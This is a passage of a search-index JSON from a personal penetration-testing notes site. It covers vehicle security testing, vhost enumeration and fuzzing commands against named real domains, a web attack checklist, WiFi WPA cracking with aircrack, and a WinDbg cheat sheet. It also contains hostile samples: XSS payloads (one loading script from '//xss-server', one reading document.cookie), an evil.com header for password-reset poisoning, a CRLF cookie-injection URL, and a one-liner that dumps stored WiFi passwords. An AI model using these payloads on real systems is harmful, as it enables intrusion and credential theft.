\u0026ldquo;Allow an app through firewall\u0026rdquo; Click Change Settings Select Burp Proxy / Charles etc. and select all 3 checkboxes (Network, Home, Public)  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/troubleshoot.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/vehicle-graybox-security-testing.html": {
        
        "title": "Vehicle Graybox Security Testing",
        "tags": [],
        "content": "Security Testing Methods  Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data)  Security Testing in Practice  Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data  Approach  Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components  Understand the Architecture  Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram  Identify valued and protectable assets  Identify relevant assets, such is hardware, software, database, etc. Parse every requirement (requirement description) for a specific asset - Splut it into SFOP scheme (Safety, Finance, Operational Performance, Privacy)  Generate Penetration Test Cases  Do X and Y on CAN Do Z and W on LIN  Perform risk-based greybox PT   Re-create attack scenarios on devices to identify potential vulns\n  Injecting,tampering\n Software checks:  Invalid address Modified SW Odd address Invalid signature Invalid seed-key Downgrade software Secure boot?      Ques?  Can we read the key, flash? Can we modify the flash or CAN messages? Can we perform a DoS and make the service unavailable Whats the goal of the attacker? What can he misuse and abuse  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/vehicle-graybox-security-testing.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/vehicle-hacking-environment.html": {
        
        "title": "Vehicle Hacking Environment",
        "tags": [],
        "content": "Using Docker and Kali Install Docker first:\n$ brew install docker # =\u0026gt; or use docker.io Use the following script:\n# ... install required kali-docker tools # setup vehicle hacking environment $ apt-get install -y build-essential $ apt-get install -y ruby $ apt-get install -y ruby-dev $ apt-get install -y rubygems $ gem install serialport -- --use-system-libraries $ apt-get -y install bluez # (for hcitool) $ apt-get install -y net-tools Using Virtual Vehicle environments jeep has been developed to offer offensive-security solution for penetration testing on vehicle systems and similar attributes.\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/vehicle-hacking-environment.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/vhost-enumeration.html": {
        
        "title": "vhost Enumeration",
        "tags": [],
        "content": "vhost discovery via ffuf:\n# =\u0026gt; first, find the total char lenght when the vhost does not exists $ curl -s -H \u0026#34;Host: thisdoesntexists.target.ba\u0026#34; http://target.ba | wc -c 246 # =\u0026gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \u0026#34;Host: FUZZ.target.ba\u0026#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:\n$ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.ba =\u0026gt; then continue here\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/vhost-enumeration.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/web-application-penetration-test-checklist.html": {
        
        "title": "Web Application Penetration Test Checklist",
        "tags": [],
        "content": "[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking â€“ An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection. [+] Posting Raw XML cross-domain [+] Generic Cross-Browser Cross-Domain theft [+] Attacking HTTPS with Cache Injection [+] Tap Jacking [+] XSS - Track [+] Next Generation Click Jacking [+] XSSing Client-Side Dynamic HTML. [+] Stroke triggered XSS and Stroke Jacking [+] Lost iN Translation [+] Persistent Cross Interface Attacks [+] Chronofeit Phishing [+] SQLi Filter Evasion Cheat Sheet (MySQL) [+] Tabnabbing [+] UI Redressing [+] Cookie Poisoning [+] SSRF [+] Bruteforce of PHPSESSID [+] Blended Threats and JavaScript [+] Cross-Site Port Attacks [+] CAPTCHA Re-Riding Attack [+] Arbitrary file access [+] Binary planting [+] Blind SQL Injection [+] Blind XPath Injection [+] Brute force attack [+] Buffer overflow attack [+] Cache Poisoning [+] Cash Overflow [+] Clickjacking [+] Command injection attacks [+] Comment Injection Attack [+] Content Security Policy [+] Content Spoofing [+] Credential stuffing [+] Cross Frame Scripting [+] Cross Site History Manipulation (XSHM) [+] Cross Site Tracing [+] Cross-Site Request Forgery (CSRF) [+] Cross Site Port Attack (XSPA) [+] Cross-Site Scripting (XSS) [+] Cross-User Defacement [+] Custom Special Character Injection [+] Denial of Service [+] Direct Dynamic Code Evaluation (â€˜Eval Injectionâ€™) [+] Execution After Redirect (EAR) [+] Exploitation of CORS [+] Forced browsing [+] Form action hijacking [+] Format string attack [+] Full Path Disclosure [+] Function Injection [+] Host Header injection [+] HTTP Response Splitting [+] HTTP verb tampering [+] HTML injection [+] LDAP injection [+] Log Injection [+] Man-in-the-browser attack [+] Man-in-the-middle attack [+] Mobile code: invoking untrusted mobile code [+] Mobile code: non-final public field [+] Mobile code: object hijack [+] One-Click Attack [+] Parameter Delimiter [+] Page takeover [+] Path Traversal [+] Reflected DOM Injection [+] Regular expression Denial of Service â€“ ReDoS [+] Repudiation Attack [+] Resource Injection [+] Server-Side Includes (SSI) Injection [+] Session fixation [+] Session hijacking attack [+] Session Prediction [+] Setting Manipulation [+] Special Element Injection [+] SMTP injection [+] SQL Injection [+] SSI injection [+] Traffic flood [+] Web Parameter Tampering [+] XPATH Injection [+] XSRF or SSRF [+] Image mime type injection [+] DNS [+] CRLF [+] 2FA [+] XSS [+] CSRF [+] SOP [+] SSRF [+] LFI \u0026amp; RFI [+] SQLi [+] File Upload [+] XXE [+] LDAP [+] MongoDB [+] IDOR [+] Web Socket [+] Click Jacking [+] No rate limit [+] CMDI [+] Directory Traversal [+] HTTP Request Smugling [+] Subdomain Takeover [+] Wordpress [+] Joomla [+] Drupal [+] HSTS [+] Host Header Attack [+] Password reset [+] Session Management [+] Github [+] HeartBleed [+] SSI [+] Recon [+] URL Rerdirect [+] HTMLi [+] SPF recored [+] Critical File Found [+] Source Code Disclosure ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/web-application-penetration-test-checklist.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/web-fuzzing-technqiues.html": {
        
        "title": "Web Fuzzing Technqiues",
        "tags": [],
        "content": " Use SecList seed fuzz Use FuzzDB seed fuzz  Using Gobuster || FFuF Gobuster fuzzing:\ncat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/common.txt \\ /tmp/php_files_only.txt | gobuster fuzz -u \\ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 ffuf fuzzing:\ncat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \\ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/symfony.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/all.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/all-dirs.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/error.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/index.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/install.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/readme.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/setup.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/test.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/debug.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/admin.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/conf.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/config.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/htaccess.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/inc.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/ini.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/sql.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/xml.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/js.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/html.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/jar.txt \\ ~/SecLists/Discovery/Web-Content/api/actions-lowercase.txt \\ ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/common.txt \\ /tmp/backup_files_only.txt \\ /tmp/log_files_only.txt \\ /tmp/UnixDotfiles.txt | ffuf -w - -u https://www.nic.ba/FUZZ -mc 200,204,301,302,307,401,403,405 -fs 0 Fuzz List # =\u0026gt; Symfony / Laravel Framework Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt Discovery/Web-Content/CMS/symfony-315-demo.txt Discovery/Web-Content/SVNDigger/symfony.txt # =\u0026gt; many stuff Discovery/Web-Content/SVNDigger/all.txt Discovery/Web-Content/SVNDigger/all-dirs.txt Discovery/Web-Content/SVNDigger/context/error.txt Discovery/Web-Content/SVNDigger/context/index.txt Discovery/Web-Content/SVNDigger/context/install.txt Discovery/Web-Content/SVNDigger/context/readme.txt Discovery/Web-Content/SVNDigger/context/root.txt Discovery/Web-Content/SVNDigger/context/setup.txt Discovery/Web-Content/SVNDigger/context/test.txt Discovery/Web-Content/SVNDigger/context/debug.txt Discovery/Web-Content/SVNDigger/context/admin.txt Discovery/Web-Content/SVNDigger/cat/Conf/conf.txt Discovery/Web-Content/SVNDigger/cat/Conf/config.txt Discovery/Web-Content/SVNDigger/cat/Conf/htaccess.txt Discovery/Web-Content/SVNDigger/cat/Database/inc.txt Discovery/Web-Content/SVNDigger/cat/Database/ini.txt Discovery/Web-Content/SVNDigger/cat/Database/sql.txt Discovery/Web-Content/SVNDigger/cat/Database/xml.txt Discovery/Web-Content/SVNDigger/cat/Language/php.txt Discovery/Web-Content/SVNDigger/cat/Language/js.txt Discovery/Web-Content/SVNDigger/cat/Language/html.txt Discovery/Web-Content/SVNDigger/cat/Language/jar.txt Discovery/Web-Content/api/actions-lowercase.txt # =\u0026gt; ruby https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/Ruby_Rails.txt # =\u0026gt; mostly php stuff Discovery/Web-Content/Common-DB-Backups.txt # =\u0026gt; good stuff Discovery/Web-Content/Common-PHP-Filenames.txt # =\u0026gt; good stuff Discovery/Web-Content/PHP.fuzz.txt # =\u0026gt; good for phpmyadmins Discovery/Web-Content/common.txt # =\u0026gt; usual stuff like .git/.rc-s/dotfiles https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/php_files_only.txt # =\u0026gt; more php # =\u0026gt; mostly api Discovery/Web-Content/swagger.txt # =\u0026gt; find swagger location Discovery/Web-Content/api/api_endpoints.txt # =\u0026gt; api endpoints # =\u0026gt; all web extensions are available below: Discovery/Web-Content/web-extensions.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/CommonWebExtensions.txt # =\u0026gt; also this one for backups https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/backup_files_only.txt https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/log_files_only.txt # =\u0026gt; for login/admin pages https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/Logins.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/cfm.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/html.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/jsp.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/php.txt # =\u0026gt; webservers https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/Apache.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/ApacheTomcat.txt # =\u0026gt; other ... https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/UnixDotfiles.txt ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/web-fuzzing-technqiues.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/web-penetration-testing-oneliners.html": {
        
        "title": "Web Penetration Testing Oneliners",
        "tags": [],
        "content": "   Also See      Check if vhost is a live on specific DNS or subdomain:\ncurl -s -H \u0026#34;Host. $SUBDOMAIN.EXAMPLE.BA\u0026#34; http://example.ba Other techniques described in vhost enumeration\nRedirect URI with a Set-Cookie in GET request:\nhttp://$EXAMPLE.BA/index.php?redirect_url=./%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass\nHeaders: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass) Permutations: * Null byte techniques * Case sensitiveness Some other techniques can be used, ie. 403 bypass via header manipulation.\nCaptcha Bypass Tricks ðŸ˜‚\nCaptcha Bypass is described in separate page.\nAlso See  Checklists are provided for both REST API Issue Library as well as Web Issue Library API Abuse and Reuse 403 Bypass  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/web-penetration-testing-oneliners.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/wifi-cracking-via-aircrack.html": {
        
        "title": "Wifi Cracking via Aircrack",
        "tags": [],
        "content": "Deploy Aircrack for cracking WPA2 / WEP in 10 seconds. Written and based on MacOS host.\n# =\u0026gt; install macports ... # =\u0026gt; install aircrack-ng $ sudo port install aircrack-ng # =\u0026gt; install latest XCode, with all Command Line Tools ... # =\u0026gt; create the following symlink $ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport # =\u0026gt; identity channel to sniff $ sudo airport -s # =\u0026gt; in another terminal $ sudo airport en1 sniff [CHANNEL] # =\u0026gt; in another terminal $ aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] Note that the cap_file will be located in the /tmp/airportSniff*.cap.\n Deploy Aircrack for Ubuntu 16.04, you will need to fix AlfaNetwork drivers.\n$ echo \u0026#34;options rt2800pci nohwcrypt=1\u0026#34; | sudo tee /etc/modprobe.d/rt2800pci.conf $ sudo modprobe -rfv rt2800pci $ sudo modprobe -v rt2800pci ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/wifi-cracking-via-aircrack.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/windbg-cheatsheets.html": {
        
        "title": "WinDbg Cheatsheets",
        "tags": [],
        "content": "Just personal things related to my frustration with WinDbg (:\nThe symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).\n.sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:\nx notepad:! Note, if ytou don7t see any output, enter .reload again:\nx notepad!*main* # =\u0026gt; 000000d0`428ff7e8 00007ff6`3282122f notepad!WinMain To put a breakpoint at notepad!WinMain, enter this command:\nbu notepad!WinMain To verify that your breakpoint was set, enter this command:\nbl # =\u0026gt; 00007ff6`32825f64 0001 (0001) 0:**** notepad!WinMain Start the process:\ng # =\u0026gt; ... # Breakpoint 0 hit # notepad!WinMain: # 00007ff6`32825f64 488bc4 mov rax,rsp To see a list of code modules that are loaded in the Notepad process, enter this command:\nlm # =\u0026gt; ... # 0:000\u0026gt; lm # start end module name # 00007ff6`32820000 00007ff6`3285a000 notepad (pdb symbols) C:\\...\\notepad.pdb # 00007ffc`ab7e0000 00007ffc`ab85b000 WINSPOOL (deferred) ... To see a stack trace, enter this command:\nk # =\u0026gt; ... # Child-SP RetAddr Call Site # 00000048`4e0cf6a8 00007ff6`3282122f notepad!WinMain # 00000048`4e0cf6b0 00007ffc`b1cf16ad notepad!WinMainCRTStartup+0x1a7 # 00000048`4e0cf770 00007ffc`b1fc4629 KERNEL32!BaseThreadInitThunk+0xd # 00000048`4e0cf7a0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d ... To break in the Notepad, choose Break from the Debug Menu.\nDebug Menu -\u0026gt; Break To set and verify a breakpoint at ZwWriteFile, enter these commands:\nbu ntdll!ZwWriteFile bl To see a list of all threads in Notepapd process, enter this command (tilde):\n~ # =\u0026gt; # 0:011\u0026gt; ~ # 0 Id: 10c8.128c Suspend: 1 Teb: 00007ff6`31cdd000 Unfrozen To look at the stack trace for thread 0, enter these commands:\n~0s k # =\u0026gt; 0:011\u0026gt; ~0s USER32!SystemParametersInfoW: 00007ffc`b12a4d20 48895c2408 mov qword ptr [rsp+8], ... 0:000\u0026gt; k Child-SP RetAddr Call Site 00000033`d1e9da48 00007ffc`adfb227d USER32!SystemParametersInfoW (Inline Function) --------`-------- uxtheme!IsHighContrastMode+0x1d 00000033`d1e9da50 00007ffc`adfb2f12 uxtheme!IsThemeActive+0x4d ... 00000033`d1e9f810 00007ffc`b1cf16ad notepad!WinMainCRTStartup+0x1a7 00000033`d1e9f8d0 00007ffc`b1fc4629 KERNEL32!BaseThreadInitThunk+0xd 00000033`d1e9f900 00000000`00000000 ntdll!RtlUserThreadStart+0x1d To quit and detach from process:\nqd ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/windbg-cheatsheets.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/windows-notes.html": {
        
        "title": "Windows Notes",
        "tags": [],
        "content": "When setting up Reverse Engineering workstation, use retoolkit for a start kit.\n Extract WiFi cleartextr password\ncls \u0026amp; echo. \u0026amp; for /f \u0026#34;tokens=4 delims=: \u0026#34; %a in (\u0026#39;netsh wlan show profiles ^| find \u0026#34;Profile \u0026#34;\u0026#39;) do @echo off \u0026gt; nul \u0026amp; (netsh wlan show profiles name=%a key=clear | findstr \u0026#34;SSID Cipher Content\u0026#34; | find /v \u0026#34;Number\u0026#34; \u0026amp; echo.) \u0026amp; @echo on Active Directory\nAccess Active Directory Domain Admin via Linux:\n$ sudo apt-get realmd $ realm join example.ba --user username See also Linux Notes\nResource:\n AD Attack-Defense Windows Data Hunting  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/windows-notes.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/xss-payloads.html": {
        
        "title": "XSS Payloads",
        "tags": [],
        "content": "JSON: {\u0026#34;email\u0026#34;:\u0026#34;some@email.com\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)//\u0026#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?\u0026#39;\u0026#34;--\u0026gt;\u0026lt;script\u0026gt;confirm(document.cookie)\u0026lt;/script\u0026gt; In URL PATH: \u0026#34;accesskey=\u0026#39;x\u0026#39; onclick=\u0026#39;confirm`1`\u0026#39; // Hi\u0026#39;\u0026amp;gt;\u0026#34;\u0026lt;script src=\u0026#34;//xss-server\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;x=\u0026#34;{9*9}\\r\\n%0a%09%0d\u0026lt;svg\\onload=confirm(1)\u0026gt; ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/xss-payloads.html"
    },
    
}
</script>


<script src="https://duraki.github.io/notes/public/js/lunr.min.js" type="text/javascript"></script>


<script src="https://duraki.github.io/notes/public/js/search.js" type="text/javascript"></script>
</body>
</html>
